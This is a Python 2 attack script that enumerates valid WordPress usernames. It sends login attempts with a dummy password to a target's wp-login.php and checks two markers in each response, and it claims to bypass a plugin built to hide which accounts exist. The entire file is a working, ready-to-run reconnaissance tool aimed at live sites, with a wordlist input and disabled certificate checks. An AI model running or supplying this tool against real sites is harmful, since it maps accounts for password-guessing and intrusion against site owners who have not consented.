#Python script for user enumeration from WordPress login page
#It works even if plugins like "Unified Login Error Messages" is installed

try:
	import requests
	import sys
	import argparse
	import ssl
except Exception,e:
	print "[!] Error: "+str(e)
	print "[*] Make sure you have the following Python modules installed:\n\trequests, argparse, ssl"
	exit(0)

parser = argparse.ArgumentParser(description="WordPress login page user enumeration. Supports 'Unified Login Error Messages' plugin bypass. Technique Reference:\nT1 = Check for 'value=\"<username>\"'\nT2 = Check for \"document.getElementById('user_pass')\"\n")
parser.add_argument('-t','--target', help='WordPress target', required=True)
parser.add_argument('-u','--users', help='File containing usernames', required=True)
parser.add_argument('-o','--outfile', help='Save output in file')
parser.add_argument('-v','--verbose', help='Show verbose message', action='store_const', const=True)
args = parser.parse_args()
target = args.target.encode('utf-8')
user_file = args.users.encode('utf-8')

f = open(user_file, "r")
user_list = f.readlines()

#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080",}
cookies = dict(wordpress_test_cookie='WP Cookie Check')

if hasattr(ssl, '_create_unverified_context'):
	ssl._create_default_https_context = ssl._create_unverified_context

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

for user in user_list:
	try:
		user = (user.replace("\r", "")).replace("\n", "")
		if args.verbose:
			print "[-] Trying: " + user
		post_data = {"log":user, "pwd":"AnyInvalidPass", "wp-submit":"Log In", "redirect_to":target+"/wp-admin/", "testcookie":"1"}
		#r = requests.post(target+"/wp-login.php", data=post_data, proxies=proxies, cookies=cookies, verify=False)
		r = requests.post(target+"/wp-login.php", data=post_data, cookies=cookies, verify=False)
		sc = r.text
		#print sc
		check1 = 'value="'+user+'"'
		check2 = "document.getElementById('user_pass')";
		#print check1
		#print check2
		#print int(sc.find(check1))
		if int(sc.find(check1)) > -1:
			print "[T1] Valid user: "+user
			if args.outfile:
				f = open(args.outfile, "a")
				f.write("[T1] Valid user: "+user+"\n")
				f.close()
		else:
			if int(sc.find(check2)) > -1:
				print "[T2] Valid user: "+user
				if args.outfile:
					f = open(args.outfile, "a")
					f.write("[T2] Valid user: "+user+"\n")
					f.close()
	except Exception,e:
		print "Exception occurred"
